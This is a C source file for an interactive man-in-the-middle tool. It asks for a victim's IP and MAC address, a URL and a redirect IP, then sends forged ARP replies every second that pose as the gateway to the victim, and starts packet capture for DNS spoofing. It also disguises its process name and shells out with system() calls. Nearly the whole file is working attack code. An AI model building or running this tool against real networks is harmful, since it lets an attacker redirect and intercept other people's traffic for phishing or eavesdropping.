#include "spoof.h"

pid_t pid;
struct options_spoofing opts;
pcap_t* nic_fd;
char* nic_device;
pthread_t thread_id;


int main(int argc, char *argv[]) {
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    u_char* args = NULL;


    struct bpf_program fp;      // holds compiled program
    bpf_u_int32 netp;           // ip
    bpf_u_int32 maskp;

    check_root_user();
    signal(SIGINT,sig_handler);
    options_spoofing_init(&opts);

    program_setup(argc, argv);              // set process name, get root privilege
    nic_device = pcap_lookupdev(errbuf);    // get interface
    pcap_lookupnet(nic_device, &netp, &maskp, errbuf);

    get_target_ip_address();
    get_target_MAC_address();
    get_MAC_address();
    get_url_address();
    get_gateway_ip_address();
    get_ip_address();   // Returning IP address
    get_device_ip(nic_device);


    // Confirm
    printf("=================================\n");
    printf("   Target   IP : %s\n", opts.target_ip);
    printf("   Request URL : %s\n", opts.request_url);
    printf("   Spoofing IP : %s\n", opts.spoofing_ip);
    printf("   Gateway  IP : %s\n", opts.gateway_ip);
    printf("=================================\n");
    puts("[ DNS Spoofing Initiated ]");

    pthread_create(&thread_id, NULL, arp_poisoning, NULL);

    // open the device for packet capture & set the device in promiscuous mode
    nic_fd = pcap_open_live(nic_device, BUFSIZ, 1, -1, errbuf);
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    puts("start looping");
    pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);

    return 0;
}


void options_spoofing_init(struct options_spoofing* option) {
    memset(option, 0, sizeof(struct options_spoofing));
}


void program_setup(int argc, char *argv[]) {
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    /* Flush caches that has website already visited */
    system(FLUSH_CASH1);
    system(FLUSH_CASH2);

    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


void get_ip_address(void) {
    uint8_t input_length;

    while (1) {
        printf("Enter [ IP ] to redirect: ");
        fflush(stdout);
        fgets(opts.spoofing_ip, sizeof(opts.spoofing_ip), stdin);
        input_length = (uint8_t) strlen(opts.spoofing_ip);
        if (input_length > 0 && opts.spoofing_ip[input_length - 1] == '\n') {
            opts.spoofing_ip[input_length - 1] = '\0';
            strcpy(opts.const_spoofing_ip, opts.spoofing_ip);
            if (is_valid_ipaddress(opts.spoofing_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void get_gateway_ip_address(void) {
    FILE* fp = NULL;
    char temp[1024] = {0};
    char* token;

    fp = popen(NETSTAT, "r");
    while (fgets(temp, sizeof(temp), fp) != NULL) {
        // Find the line that contains "0.0.0.0" or "default"
        if (strstr(temp, "0.0.0.0") != NULL || strstr(temp, "default") != NULL) {
            // Extract the gateway IP address
            token = strtok(temp, " ");
            while (token != NULL) {
                if (strcmp(token, "0.0.0.0") == 0 || strcmp(token, "default") == 0) {
                    token = strtok(NULL, " ");
                    strcpy(opts.gateway_ip, token);
                    break;
                }
                token = strtok(NULL, " ");
            }
            break;
        }
    }
    pclose(fp);
}


void get_target_ip_address(void) {
    uint8_t input_length;

    while (1) {
        printf("\nTarget [ IP ] : ");
        fflush(stdout);
        fgets(opts.target_ip, sizeof(opts.target_ip), stdin);
        input_length = (uint8_t) strlen(opts.target_ip);
        if (input_length > 0 && opts.target_ip[input_length - 1] == '\n') {
            opts.target_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts.target_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void get_url_address(void) {
    uint8_t input_length;
    while (1) {
        printf("\nWhen victim access the url below, will go different webpage\n"
               "Enter [ URL ]: ");
        fflush(stdout);
        fgets(opts.request_url, sizeof(opts.request_url), stdin);
        input_length = (uint8_t) strlen(opts.request_url);
        if (input_length > 0 && opts.request_url[input_length - 1] == '\n') {
            opts.request_url[input_length - 1] = '\0';
            break;
        }
    }
}


void get_device_ip(char* nic_device) {
    int n;
    struct ifreq ifr;

    n = socket(AF_INET, SOCK_DGRAM, 0);
    //Type of address to retrieve - IPv4 IP address
    ifr.ifr_addr.sa_family = AF_INET;
    //Copy the interface name in the ifreq structure
    strncpy(ifr.ifr_name, nic_device, IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);
    //display result
    strcpy(opts.device_ip, inet_ntoa(((struct sockaddr_in *) &ifr.ifr_addr)->sin_addr));
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void sig_handler(int signum) {
    //Return type of the handler function should be void
    char cmd[64] = {0};
    pid = getpid();
    printf("Ctrl + C pressed\n Exit program \n");
    sprintf(cmd, "sudo kill -9 %d", pid);
    kill(pid,SIGUSR1);

    // extra kill for sometimes not successfully killed
    system(cmd);
}


void get_MAC_address() {
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (!(ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
    }

    if (success) memcpy(opts.device_MAC, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
}


void get_target_MAC_address(void) {
    char command[100] = {0};
    char mac_str[20] = {0};
    uint8_t input_length = 0;
    const char* delimiter = ":";
    char *token;
    int i = 0;
    sprintf(command, "arping -c 1 -I %s %s", nic_device, opts.target_ip);
    system(command);

    printf("\nType Mac address: ");
    fflush(stdout);
    fgets(mac_str, 20, stdin);
    input_length = (uint8_t) strlen(mac_str);
    if (input_length > 0 && opts.request_url[input_length - 1] == '\n') {
        opts.request_url[input_length - 1] = '\0';
    }

    token = strtok(mac_str, delimiter);
    while (token != NULL && i < 6) {
        opts.target_MAC[i] = (unsigned char)strtol(token, NULL, 16);
        token = strtok(NULL, ":");
        i++;
    }
}


void* arp_poisoning() {
    int sockfd;
    int i = 0;
    char *token = NULL;
    char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)] = {0};
    struct ether_header* eth = (struct ether_header *) packet;
    struct ether_arp* arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
    struct sockaddr_ll device;

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("socket");
        close(sockfd);
        exit(1);
    }

    memcpy(eth->ether_dhost, opts.target_MAC, ETH_ALEN);//bcast
    memcpy(eth->ether_shost, opts.device_MAC, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = ETH_ALEN;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

    memcpy(arp->arp_sha, opts.device_MAC, ETH_ALEN);
    token = strtok(opts.gateway_ip, ".");
    while (token != NULL) {
        arp->arp_spa[i] = (unsigned char)strtol(token, NULL, 10);
        token = strtok(NULL, ".");
        i++;
    }
    i = 0;
    memcpy(arp->arp_tha, opts.target_MAC, ETH_ALEN);
    token = strtok(opts.target_ip, ".");
    while (token != NULL) {
        arp->arp_tpa[i] = (unsigned char)strtol(token, NULL, 10);
        token = strtok(NULL, ".");
        i++;
    }

    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(nic_device);
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
    device.sll_halen = htons(ETH_ALEN);

    puts("press ctrl+c to exit.");
    while (1) {
        sendto(sockfd, packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *) &device, sizeof(device));
        sleep(1);
    }
}

